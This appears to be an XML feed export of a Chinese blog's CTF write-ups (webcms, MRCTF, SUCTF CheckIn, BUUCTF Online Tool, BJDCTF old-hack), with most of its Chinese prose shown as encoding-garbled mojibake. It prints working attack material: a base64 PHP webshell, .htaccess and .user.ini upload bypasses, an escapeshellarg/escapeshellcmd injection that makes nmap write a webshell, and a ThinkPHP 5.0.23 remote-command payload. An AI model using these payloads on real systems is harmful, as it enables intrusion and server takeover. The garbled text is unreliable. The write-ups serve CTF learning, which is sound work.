class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">1</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"Source"</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"source"</span>;<span class="hljs-attribute">S</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"\66lag.php"</span>;&#125;&#125;');<span class="hljs-selector-tag">echo</span> <span class="hljs-selector-tag">urlencode</span>('<span class="hljs-attribute">ae5860e508aaf353a9ad78ac246f46fba</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">1</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"Source"</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"source"</span>;<span class="hljs-attribute">S</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"\66lag.php"</span>;&#125;&#125;');<span class="hljs-selector-tag">Copy</span></code></pre></div><p><a href="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" srcset="/img/loading.gif" alt="hodor.png"></a></p><p>å‚è€ƒ</p><p><a href="https://blog.csdn.net/SmileAndFun/article/details/108497183" target="_blank" rel="noopener">https://blog.csdn.net/SmileAndFun/article/details/108497183</a></p><h3 id="webcms"><a href="#webcms" class="headerlink" title="webcms"></a>webcms</h3><p>æ˜¯ä¸€ä¸ªåšå®¢ç®¡ç†çš„ç½‘ç«™ï¼Œå…¶å®ä¹Ÿæ˜¯ä¸ªåŸé¢˜ï¼Œè€ƒå¯Ÿç‚¹æ˜¯æ–‡ä»¶ä¸Šä¼ </p><p>æ¼æ´ç‚¹åœ¨å›¾ç‰‡ä¸­ä¸Šä¼ å›¾ç‰‡çš„ä½ç½®</p><p><a href="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" srcset="/img/loading.gif" alt="webcms.png"></a></p><p>éšä¾¿ä¸Šä¼ ä¸€å¼ å›¾ç‰‡è¯•è¯•ï¼ŒæŠ“åŒ…ç»“æœå¦‚ä¸‹ï¼Œå‡ ä¸ªæ³¨æ„ç‚¹</p><p><a href="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" srcset="/img/loading.gif" alt="webcms2.png"></a></p><blockquote><p>1.filetypeè§„å®šäº†æ–‡ä»¶çš„ç±»å‹</p><p>2.ä¸Šä¼ æ—¶ï¼Œå°†å›¾ç‰‡ä¿å­˜ä¸ºäº†base64å½¢å¼</p><p>æ‰€ä»¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬çš„æ—¶å€™è¦æ³¨æ„ä¿®æ”¹å¯¹åº”çš„ä½ç½®</p></blockquote><p>ä¸€å¥è¯æœ¨é©¬ç±»å‹ä¸ºphp,åˆ™filetypeæ”¹ä¸ºphp</p><p>å†…å®¹ä¸ºå¯†ç ä¸ºcmdä¸€å¥è¯æœ¨é©¬ï¼Œå¯¹åº”çš„base64ç¼–ç <code>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p><p><a href="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" srcset="/img/loading.gif" alt="webcms3.png"></a></p><p>ä¸Šä¼ æˆåŠŸï¼Œè®¿é—®ä¿å­˜çš„è·¯å¾„ï¼š<code>http://219.219.61.234:20203/upload/tmp/1_Y2R8AK57UWV4JBW.php</code></p><div class="hljs"><pre><code class="hljs dockerfile">POST:<span class="hljs-keyword">cmd</span><span class="bash">=system(<span class="hljs-string">"cat /flag"</span>);</span>æˆ–è€…èšå‰‘è¿æ¥ï¼Œå¯†ç cmdCopy</code></pre></div><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>MIscéƒ¨åˆ†åŸºæœ¬éƒ½æ˜¯é˜Ÿå‹åšçš„ï¼Œå¥½åƒä¹Ÿä¸æ˜¯å¤ªéš¾</p><h3 id="ä¼ªweb"><a href="#ä¼ªweb" class="headerlink" title="ä¼ªweb"></a>ä¼ªweb</h3><p>çœŸæ˜¯ä¼ªwebã€‚ã€‚ã€‚</p><p>ç›´æ¥åœ¨æ–‡ä»¶é‡Œæœç´¢å°±èƒ½åˆ°flag</p><p>æœç´¢å…³é”®è¯cmutï¼Œflagæ‰€åœ¨æ–‡ä»¶å¤¹ä¸ºhtml\include\include.php</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unserialize</tag>
      
      <tag>ssti</tag>
      
      <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-LFI</title>
    <link href="/2020/10/08/buuoj-LFI/"/>
    <url>/2020/10/08/buuoj-LFI/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LFI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-upload</title>
    <link href="/2020/10/08/buuoj-upload/"/>
    <url>/2020/10/08/buuoj-upload/</url>
    
    <content type="html"><![CDATA[<h1 id="buuctf-upload"><a href="#buuctf-upload" class="headerlink" title="buuctf-upload"></a>buuctf-upload</h1><a id="more"></a><h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸäº†ï¼Œè¿˜ç»™å‡ºäº†æ–‡ä»¶çš„ä¿å­˜è·¯å¾„</p><p>å†å°è¯•ä¸Šä¼ <code>1.php</code>ä½†æ˜¯å‡ºç°äº†ï¼ŒæŠ¥é”™æç¤º</p><p>é¦–å…ˆå°è¯•çš„æ˜¯ï¼Œå°†<code>Content-Type: image/jpeg</code>æ”¹ä¸ºå›¾ç‰‡ç±»å‹ï¼Œä½†æ˜¯è¿˜æ˜¯æ— æ³•ä¸Šä¼ </p><p>å†å°è¯•ä¸€ä¸‹.htaccessæ–‡ä»¶</p><p>æ–‡ä»¶å†…å®¹</p><div class="hljs"><pre><code class="hljs <FilesMatch">SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;</code></pre></div><p><img src="https://i.loli.net/2020/11/30/Hi3YGuQoWCzg1P2.png" srcset="/img/loading.gif" alt></p><p>ä¸Šä¼ æˆåŠŸåï¼Œå†ä¸Šä¼ åŒ…å«ä¸€å¥è¯æœ¨é©¬çš„ a.jpgæ–‡ä»¶ï¼Œ<code>.htaccess</code>æ–‡ä»¶çš„ä½œç”¨å°±æ˜¯å°†æŒ‡å®šç±»å‹çš„æ–‡ä»¶å½“ä½œphpæ–‡ä»¶è¿è¡Œ</p><p>æ‰€ä»¥è¡¨é¢ä¸Šæ˜¯jpgç±»å‹çš„æ–‡ä»¶ï¼Œä½†æ˜¯æ˜¯å½“ä½œphpæ–‡ä»¶</p><p><img src="https://i.loli.net/2020/11/30/83GHiZg5Ao7IbnF.png" srcset="/img/loading.gif" alt></p><p>ä¸Šä¼ æˆåŠŸåï¼Œèšå‰‘è®¿é—®<code>url+/upload/3af588e32ac72180588d18d5c3b470b4/a.jpg</code></p><p>å¯†ç ä¸ºï¼šcmd</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>è¯•ç€ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºéæ³•åç¼€åï¼Œç»§ç»­ä¿®æ”¹åç¼€åï¼Œå‘ç°php3,php5,phtmlç­‰å¯æ‰§è¡Œæ–‡ä»¶åä¸å¯ä¸Šä¼ </p><p>æƒ³åˆ°ä¸Šä¼ <code>.htacess</code>æ–‡ä»¶ï¼Œä½†æ˜¯ä¹Ÿæç¤ºäº†éæ³•åç¼€åï¼Œè¿™ä¸ªæ–¹æ³•è¡Œä¸é€šäº†</p><p>ä½†æ˜¯ä¹‹å‰åšupload-labsä¸­è¿˜æœ‰ä¸€ä¸ªä¸Šä¼ <code>.user.ini</code>çš„æ–‡ä»¶</p><p><code>.user.ini</code>æ˜¯ä»€ä¹ˆ</p><blockquote><p>è¿™å¾—ä»php.iniè¯´èµ·äº†ã€‚php.iniæ˜¯phpé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å¾ˆå¤šphpçš„é…ç½®ï¼Œè¿™äº›é…ç½®ä¸­ï¼Œåˆåˆ†ä¸ºå‡ ç§ï¼š<code>PHP_INI_SYSTEM</code>ã€<code>PHP_INI_PERDIR</code>ã€<code>PHP_INI_ALL</code>ã€<code>PHP_INI_USER</code>ã€‚</p></blockquote><p><code>.user.ini</code>çš„ä½œç”¨</p><blockquote><p>å¯ä»¥å€ŸåŠ©.user.iniè½»æ¾è®©<strong>æ‰€æœ‰</strong>phpæ–‡ä»¶éƒ½â€œè‡ªåŠ¨â€åŒ…å«æŸä¸ªæ–‡ä»¶ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥æ˜¯ä¸€ä¸ªæ­£å¸¸phpæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåŒ…å«ä¸€å¥è¯çš„webshell</p></blockquote><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">ä¼ é€é—¨</a></p><p><strong>å¼€å§‹åšé¢˜</strong></p><p>ä¸Šä¼ .user.iniæ–‡ä»¶</p><p><img src="https://i.loli.net/2020/11/30/5zEkKtamYMgWoTh.png" srcset="/img/loading.gif" alt></p><p>GIF89aæ˜¯GIFæ–‡ä»¶å†…å®¹å¼€å¤´çš„å‡ ä¸ªå­—ç¬¦ï¼Œå…¶ä½œç”¨æ˜¯ä¸ºç±»ç»•è¿‡<code>exif_imagetype()</code></p><p>ä¸Šä¼ 1.gif</p><p><img src="https://i.loli.net/2020/11/30/6sJc1x7viwNqa3Y.png" srcset="/img/loading.gif" alt></p><p>æ–‡ä»¶ä¿å­˜çš„è·¯å¾„å·²ç»ç»™å‡ºï¼Œå¼€å§‹èšå‰‘é“¾æ¥çš„è¿æ¥æ˜¯</p><div class="hljs"><pre><code class="hljs angelscript">url/uploads/<span class="hljs-number">04</span>b0951938d905b41348c1548f9c338b/<span class="hljs-number">1.</span>gif</code></pre></div><p>ä½†æ˜¯ä¸€ç›´è¿æ¥ä¸ä¸Š</p><p>åæ¥é“¾æ¥index.phpæ‰è¿æ¥ä¸Šï¼Œè¿™é‡Œæƒ³åˆ°äº†<code>.user.ini</code>ä½œç”¨ï¼Œæ˜¯è®©æ‰€æœ‰çš„phpæ–‡ä»¶åŒ…å«æ•´ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œè€Œè¿™é‡Œæ–‡ä»¶è·¯å¾„å­˜åœ¨ä¸€ä¸ªindex.phpï¼Œæ‰€æœ‰è¯´index.phpä¸­ä¹Ÿå­˜åœ¨è¿™ä¸ªä¸€å¥è¯æœ¨é©¬</p><div class="hljs"><pre><code class="hljs llvm">/uploads/<span class="hljs-number">04</span>b<span class="hljs-number">0951938</span>d<span class="hljs-number">905</span>b<span class="hljs-number">41348</span><span class="hljs-keyword">c</span><span class="hljs-number">1548</span>f<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">338</span>b/index.php</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>.htacess</tag>
      
      <tag>.user.ini</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-z7z8</title>
    <link href="/2020/10/08/buuoj-z7z8/"/>
    <url>/2020/10/08/buuoj-z7z8/</url>
    
    <content type="html"><![CDATA[<p>buuctfä¸Šçš„å…¶ä»–é¢˜å‹çš„é›†åˆï¼Œæ‡’å¾—åˆ†ç±»äº†</p><h1 id="buuctf-z7z8"><a href="#buuctf-z7z8" class="headerlink" title="buuctf-z7z8"></a>buuctf-z7z8</h1><a id="more"></a><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;  $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>];&#125;<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'host'</span>])) &#123;  highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125; <span class="hljs-keyword">else</span> &#123;  $host = $_GET[<span class="hljs-string">'host'</span>];  $host = escapeshellarg($host);  $host = escapeshellcmd($host);  $sandbox = md5(<span class="hljs-string">"glzjin"</span>. $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]);  <span class="hljs-keyword">echo</span> <span class="hljs-string">'you are in sandbox '</span>.$sandbox;  @mkdir($sandbox); <span class="hljs-comment">//åˆ›å»ºäº†è·¯å¾„</span>  chdir($sandbox);  <span class="hljs-keyword">echo</span> system(<span class="hljs-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);&#125;</code></pre></div><p>å‰é¢çš„ä¸¤æ®µä»£ç æ²¡å•¥ç”¨ï¼Œä¸»è¦æ˜¯åé¢å¤„ç†  <code>host</code>çš„è¿‡ç¨‹</p><p><strong>1.çŸ¥è¯†å‚¨å¤‡</strong></p><blockquote><p><strong>escapeshellarg()</strong> å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å« <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a>, <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">æ‰§è¡Œè¿ç®—ç¬¦</a> ã€‚</p></blockquote><blockquote><p><strong>escapeshellcmd()</strong> å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° <a href="https://www.php.net/manual/zh/function.exec.php" target="_blank" rel="noopener">exec()</a> æˆ– <a href="https://www.php.net/manual/zh/function.system.php" target="_blank" rel="noopener">system()</a> å‡½æ•°ï¼Œæˆ–è€… <a href="https://www.php.net/manual/zh/language.operators.execution.php" target="_blank" rel="noopener">æ‰§è¡Œæ“ä½œç¬¦</a> ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚</p><p>åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$<code>,</code>\x0A<code>å’Œ</code>\xFF<code>ã€‚</code>â€˜<code>å’Œ</code>â€œ<code>ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ</code>%<code>å’Œ</code>!` å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</p></blockquote><p><strong>nampå‘½ä»¤</strong></p><blockquote><p><code>-T5</code> :æ‰«æç­‰çº§,è¶Šå¤§è¶Šå¿«,è¶Šå¿«è¶Šä¸å®‰å…¨,æœ€å¥½è®¾ç½®ä¸º<code>-T4</code><br><code>-sT</code> :TCP connent æ‰«æ,ä¸å¤ªå®‰å…¨(ç•™ä¸‹è®°å½•ä¿¡æ¯),è€Œä¸”é€Ÿåº¦è¾ƒæ…¢,ä¸€èˆ¬å…ˆä½¿ç”¨-sSæµ‹è¯•<br><code>-Pn</code> :ç¦ç”¨ping<br><code>-host-timeout 2</code>:è®¾ç½®æ‰«æä¸€å°ä¸»æœºçš„æ—¶é—´ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½ã€‚<br><code>-F</code> :å¿«é€Ÿæ‰«ææ¨¡å¼ï¼Œåªæ‰«æåœ¨nmap-servicesæ–‡ä»¶ä¸­åˆ—å‡ºçš„ç«¯å£ã€‚</p></blockquote><p><strong>æ¼æ´ç‚¹åœ¨è¿™</strong></p><p>echo system(â€œnmap -T5 -sT -Pn â€“host-timeout 2 -F â€œ.$host);</p><p>è¿™æœ‰ä¸ªsystemæ¥æ‰§è¡Œå‘½ä»¤ï¼Œè€Œä¸”æœ‰ä¼ å‚ï¼Œè‚¯å®šæ˜¯åˆ©ç”¨è¿™é‡Œäº†</p><p><strong>2.æ„é€ payload</strong></p><blockquote><ol><li>ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š<code>172.17.0.2&#39; -v -d a=1</code></li><li>ç»è¿‡<code>escapeshellarg</code>å¤„ç†åå˜æˆäº†<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚</li><li>ç»è¿‡<code>escapeshellcmd</code>å¤„ç†åå˜æˆ<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>ï¼Œè¿™æ˜¯å› ä¸º<code>escapeshellcmd</code>å¯¹<code>\</code>ä»¥åŠæœ€åé‚£ä¸ª<strong>ä¸é…å¯¹å„¿</strong>çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼š<a href="http://php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.escapeshellcmd.php</a></li><li>æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>ï¼Œç”±äºä¸­é—´çš„<code>\\</code>è¢«è§£é‡Šä¸º<code>\</code>è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„<code>&#39;</code>æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„<code>&#39;</code>é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸º<code>curl 172.17.0.2\ -v -d a=1&#39;</code>ï¼Œå³å‘<code>172.17.0.2\</code>å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸º<code>a=1&#39;</code></li></ol></blockquote><p><strong>å›åˆ°<code>mail</code>ä¸­ï¼Œæˆ‘ä»¬çš„ payload æœ€ç»ˆåœ¨æ‰§è¡Œæ—¶å˜æˆäº†<code>&#39;-fa&#39;\\&#39;&#39;\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\&#39;</code>ï¼Œåˆ†å‰²åå°±æ˜¯<code>-fa\(</code>ã€<code>-OQueueDirectory=/tmp</code>ã€<code>-X/var/www/html/test.php</code>ã€<code>)@a.com&#39;</code>ï¼Œæœ€ç»ˆçš„å‚æ•°å°±æ˜¯è¿™æ ·è¢«æ³¨å…¥çš„ã€‚</strong></p><p><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">å‚è€ƒ</a></p><p>éœ€è¦ç»•è¿‡ä¸Šé¢çš„ä¸¤ä¸ªå‡½æ•°ï¼Œå…ˆè¯•è¯•ä¸¤ä¸ªå‡½æ•°çš„ä½œç”¨</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$host = <span class="hljs-string">" 1'shellcode "</span>;$host = escapeshellarg($host);<span class="hljs-keyword">echo</span> $host;<span class="hljs-keyword">echo</span> <span class="hljs-string">"\n"</span>;$host = escapeshellcmd($host);<span class="hljs-keyword">echo</span> $host;<span class="hljs-meta">?&gt;</span><span class="hljs-string">' 1'</span>\<span class="hljs-string">''</span>shellcode <span class="hljs-string">'</span><span class="hljs-string">'</span> <span class="hljs-number">1</span><span class="hljs-string">'\\'</span><span class="hljs-string">'shellcode \'</span></code></pre></div><p>æ„é€ çš„ä¸€å¥è¯æœ¨é©¬ä¸ºï¼š<code>&#39; &lt;?php @shellcode?&gt; -oG hack.php &#39;</code></p><p>è¿è¡Œç»“æœä¸ºï¼š<code>&#39; &#39;\\&#39;&#39;\&lt;\?php eval\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39; &#39;</code></p><p>è¿™é‡Œçš„å•å¼•å·éƒ½æ˜¯æˆå¯¹å‡ºç°çš„ï¼Œæ‰€ä»¥æ²¡å½±å“</p><p>payload:</p><div class="hljs"><pre><code class="hljs xml">?host=' <span class="php"><span class="hljs-meta">&lt;?php</span> @shellcode<span class="hljs-meta">?&gt;</span></span> -oG hack.php '</code></pre></div><p><img src="https://i.loli.net/2020/10/24/1kHWE9zFn6L3XsB.png" srcset="/img/loading.gif" alt="online1.png"></p><p>ä¸Šä¼ æ–‡ä»¶çš„ä¿å­˜è·¯å¾„ï¼Œåˆ©ç”¨èšå‰‘é“¾æ¥ä¸€ä¸‹</p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/qq_26406447/article/details/100711933" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/100711933</a></p><p><a href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" target="_blank" rel="noopener">https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</a></p><p>(å†™çš„æœ‰ç‚¹ä¹±)</p><h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h2><p>æ‰“å¼€é¡µé¢å‡ºç°äº†æç¤º</p><p><img src="https://i.loli.net/2020/10/24/e2hpjI7tioY3gN9.png" srcset="/img/loading.gif" alt="cve.png"></p><p>è¿™é‡Œåº”è¯¥æ˜¯php5çš„æ¼æ´åˆ©ç”¨ï¼Œå’Œæ”»é˜²ä¸–ç•Œçš„ä¸€é“é¢˜æ¯”è¾ƒåƒ<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5412&page=1" target="_blank" rel="noopener">ä¼ é€é—¨</a></p><p>å…ˆçœ‹çœ‹æŠ¥é”™ä¿¡æ¯:1 <code>url+?s=1</code></p><p><img src="https://i.loli.net/2020/10/24/3H6YjEuRLQfGl28.png" srcset="/img/loading.gif" alt="cve-1.png"></p><p>phpç‰ˆæœ¬ä¸º5.0.23ï¼Œä¸Šç½‘æœäº†ä¸€ä¸‹è¿™ç‰ˆæœ¬çš„æ¼æ´</p><p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p><p>ç›´æ¥æ„é€ payloadï¼Œè¯»å–ç›®å½•</p><div class="hljs"><pre><code class="hljs dts">url<span class="hljs-symbol">POST:</span>_method=__construct<span class="hljs-variable">&amp;filter</span>[]=system<span class="hljs-variable">&amp;server</span>[REQUEST_METHOD]=ls /</code></pre></div><p>çœ‹åˆ°äº†flagæ–‡ä»¶</p><p>è¯»å–flag</p><div class="hljs"><pre><code class="hljs dts">url<span class="hljs-symbol">POST:</span>_method=__construct<span class="hljs-variable">&amp;filter</span>[]=system<span class="hljs-variable">&amp;server</span>[REQUEST_METHOD]=cat /flag</code></pre></div><p><img src="https://i.loli.net/2020/10/24/VBW2Xg7yfmR4ciE.png" srcset="/img/loading.gif" alt="cve-3.png"></p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><div class="hljs"><pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you<span class="hljs-keyword">include</span> <span class="hljs-string">'flag.php'</span>;$flag=<span class="hljs-string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'gg'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'id'</span>])) &#123;$id=$_GET[<span class="hljs-string">'id'</span>];$gg=$_GET[<span class="hljs-string">'gg'</span>];<span class="hljs-keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'You got the first step'</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'passwd'</span>])) &#123;$passwd=$_POST[<span class="hljs-string">'passwd'</span>];<span class="hljs-keyword">if</span> (!is_numeric($passwd)) &#123;<span class="hljs-keyword">if</span>($passwd==<span class="hljs-number">1234567</span>) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'Good Job!'</span>;highlight_file(<span class="hljs-string">'flag.php'</span>);<span class="hljs-keyword">die</span>(<span class="hljs-string">'By Retr_0'</span>);&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"can you think twice??"</span>;&#125;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'You can not get it !'</span>;&#125;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">'only one way to get the flag'</span>);&#125;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"You are not a real hacker!"</span>;&#125;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">'Please input first'</span>);&#125;&#125;</code></pre></div><p>å…ˆF12æ‰¾ä¸€æ‰¾æç¤ºï¼ŒåŸæ¥å°±æ˜¯æ ¼å¼åŒ–å¥½çš„æºç </p><div class="hljs"><pre><code class="hljs lisp">if (<span class="hljs-name">md5</span>($id) === md5($gg) <span class="hljs-symbol">&amp;&amp;</span> $id !== $gg)</code></pre></div><p>ç›´æ¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨md5å¼ºç¢°æ’çš„ä¸¤å­—ç¬¦ä¸²</p><div class="hljs"><pre><code class="hljs llvm">param<span class="hljs-number">1</span>=M<span class="hljs-symbol">%C9h</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%0</span>E<span class="hljs-symbol">%E3</span><span class="hljs-symbol">%5</span>C<span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span>r<span class="hljs-symbol">%D4w</span><span class="hljs-symbol">%7</span>Br<span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%D3o</span><span class="hljs-symbol">%A7</span><span class="hljs-symbol">%B2</span><span class="hljs-symbol">%1</span>B<span class="hljs-symbol">%DCV</span><span 